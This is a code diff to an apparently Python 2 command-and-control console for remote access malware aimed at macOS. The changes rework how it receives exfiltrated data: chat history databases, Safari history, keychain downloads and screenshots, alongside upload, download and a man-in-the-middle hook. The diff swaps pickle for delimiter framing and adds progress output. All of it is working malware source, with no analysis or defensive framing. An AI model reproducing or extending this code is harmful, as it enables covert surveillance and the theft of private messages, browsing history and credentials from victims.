@@ -59,13 +59,17 @@ def string_log(logged, client_log_path, client_name):
             pass
         open(os.path.join(client_log_path, client_name + ".txt"), 'w').close() #create file if it does not exist
     with open(os.path.join(client_log_path, client_name + ".txt"), "ab") as content:
-        if len(logged) > 0:
-            if logged[-1] == '\n':
-                content.write(logged)#fixes double printing of new line
+        #print repr(logged)
+        try:
+            if len(logged) > 0:
+                if logged[-1] == '\n':
+                    content.write(logged)#fixes double printing of new line
+                else:
+                    content.write(logged + '\n')
             else:
-                content.write(logged + '\n')
-        else:
-            content.write(logged)
+                content.write(logged)
+        except UnicodeError:
+            content.write('\n**Unicode Error**\n')
 
 def byte_convert(byte):
     for count in ['B','K','M','G']:
@@ -102,27 +106,40 @@ def decode(key, enc):
     return "".join(dec)
 
 def send_msg(sock, msg):
-    msg = pickle.dumps(msg)
-    finalMsg = struct.pack('>I', len(msg)) + msg
-    sock.sendall(finalMsg)
+    #msg = pickle.dumps(msg)
+    final_msg = struct.pack('>I', len(msg)) + msg
+    sock.sendall(final_msg)
 
-def recv_msg(sock):
-    raw_msglen = recvall(sock, 4, True)
+def recv_msg(sock, display_bytes=False):
+    raw_msglen = recvall(sock, 4, True, False)
+    raw_EOF = recvall(sock, 1, True, False)
     if not raw_msglen:
         return None
     msglen = struct.unpack('>I', raw_msglen)[0]
-    return recvall(sock, msglen, False)
+    EOF = struct.unpack('?', raw_EOF)[0]
+    return (recvall(sock, msglen, False, display_bytes), EOF)
 
-def recvall(sock, n, length):
+def recvall(sock, n, length, display_bytes):
     if length:
-        return sock.recv(4)
+        return sock.recv(n)
     data = ''
     while len(data) < n:
-        packet = sock.recv(n - len(data))
-        if not packet:
-            return None
-        data += packet
-    return pickle.loads(data) #convert the data back to normal
+        try:
+            packet = sock.recv(n - len(data))
+        except KeyboardInterrupt:
+            sys.stdout.write("%sEmptying socket. You have to wait for this task to end.\n" % bluePlus)
+        try:
+            data += packet
+            if display_bytes:
+                sys.stdout.write('%sGot [%s/%s] bytes\r' % (yellow_star, byte_convert(len(data)), byte_convert(n)))
+            if not packet:
+                return None
+        except KeyboardInterrupt:
+            sys.stdout.write("%sEmptying socket. You have to wait for this task to end.\n" % bluePlus)
+
+    if display_bytes:
+        sys.stdout.write('\n')
+    return data #convert the data back to normal
 
 def tab_parser(text, exist):
     global file_list
@@ -267,6 +284,9 @@ def main():
             first_run = True
             now = datetime.datetime.now()
 
+        next_msg_is_fxn_data = (False, '')
+        fxn_headers = ['C5EBDE1F', 'downloader', 'keychain_download', '6E87CF0B']
+
         while active:
             try:
                 columns = row_set()
@@ -274,22 +294,33 @@ def main():
                     if process_running:
                         send_msg(connections[activate], 'sigint9kill') #this will kill their blocking program, reset our data
                         while 1:
-                            x = recv_msg(connections[activate])
-                            if x:
-                                if x[0] == 'terminated':
-                                    break
-                            continue
-                    data = "\n"
+                            try:
+                                x = recv_msg(connections[activate])
+                                if x:
+                                    if x[0] == 'terminated':
+                                        break
+                                    if 'sigint9kill' in x[0]: #will handle double loop backs
+                                        break
+                                continue
+                            except KeyboardInterrupt:
+                                continue
+                    data = '\n'
                     ctrlC = False
                 else:
-                    try:
-                        (data, isFinished) = recv_msg(connections[activate])
-                    except TypeError:
-                        print "\n%s%sLost connection to server.%s" % (red, bold, endC)
-                    if not isFinished:
-                        print data, #print it and continue
-                        string_log(data, client_log_path, client_name)
-                        continue #just go back to top and keep receiving
+                    if next_msg_is_fxn_data[0]:
+                        (data, isFinished) = recv_msg(connections[activate], True)
+                        data = ''.join((next_msg_is_fxn_data[1], data))
+                        next_msg_is_fxn_data = (False, '')
+                    else:
+                        (data, isFinished) = recv_msg(connections[activate], False)
+                        if not isFinished:
+                            if data in fxn_headers: #chat_history
+                                next_msg_is_fxn_data = (True, data) #function too :D
+                                continue
+                            else:
+                                print data, #print it and continue
+                                string_log(data, client_log_path, client_name)
+                                continue #just go back to top and keep receiving
                 nextcmd = ''
                 process_running = False
 
@@ -337,7 +368,7 @@ def main():
                     string_log(workingdir + '\n', client_log_path, client_name)
 
                 elif data.startswith('downloader'):
-                    (fileContent, file_name) = pickle.loads(data[10:])
+                    (fileContent, file_name) = data[10:].split('dl_delimiter_x22x32')
                     downloader(fileContent, file_name, client_log_path, client_name)
 
                 elif data.startswith("mitmReady"):
@@ -388,16 +419,16 @@ def main():
                         print "%sGot screenshot [%s]" % (greenCheck, fancyTime)
 
                 elif data.startswith('C5EBDE1F'):
-                    deserialize = pickle.loads(data[8:])
+                    deserialize = data[8:].split('C5EBDE1F_tuple')
                     for x in deserialize:
-                        (name, data) = x #name will be the user, which we're going to want on the path
-                        downloader(bz2.decompress(data), 'ChatHistory_%s.db' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Chat/%s' % name)
+                        (name, data) = x.split('C5EBDE1F') #name will be the user, which we're going to want on the path
+                        downloader(data, 'ChatHistory_%s.db' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Chat/%s' % name)
                     print "%sGot macOS Chat History" % greenCheck
 
                 elif data.startswith('6E87CF0B'):
-                    deserialize = pickle.loads(data[8:])
+                    deserialize = data[8:].split('6E87CF0B_tuple')
                     for x in deserialize:
-                        (name, data) = x #name will be the user, which we're going to want on the path
+                        (name, data) = x.split('6E87CF0B') #name will be the user, which we're going to want on the path
                         downloader(bz2.decompress(data), 'history_%s.txt' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Safari/%s' % name)
                     print "%sGot Safari History" % greenCheck
 
@@ -627,21 +658,21 @@ def main():
                             local_file= raw_input("🌈  Enter full path to file on local machine: ")
                         else:
                             local_file = nextcmd[7:] #take path as stdin
-                        try:
-                            FNULL = open(os.devnull, 'w') ## open /dev/null to pipe STDERR to it
-                            local_file = subprocess.check_output('printf %s' % local_file, stderr=FNULL ,shell=True) #get the un-escaped version for python recognition
+                        if not local_file:
+                            print '%sNo file specified' % bluePlus
+                            nextcmd = ''
+                        else:
+                            local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
                             if os.path.isfile(local_file):
                                 with open(local_file, 'rb') as content:
-                                    sendFile = content.read()
+                                    send_file = content.read()
                                     file_name = content.name.split('/')[-1] #get absolute file name (not path)
                                 file_name = raw_input("Uploading file as [%s]. Enter new name if desired: " % file_name) or file_name
-                                nextcmd = "uploader%s" % pickle.dumps((sendFile, file_name))
+                                nextcmd = "uploader%s" % 'ul_delimeter_x22x32'.join((send_file, file_name))
                             else:
                                 print "Could not find [%s]!" % local_file
                                 nextcmd = ''
-                        except subprocess.CalledProcessError:
-                            print '%s%s%s' % (red_minus,red,"Canceled.")
-                            nextcmd = ''
+
                     if nextcmd.startswith("download"): #uploads to CWD.
                         if nextcmd == "download":
                             remote_file = raw_input("🐸  Enter path to file on remote machine: ")
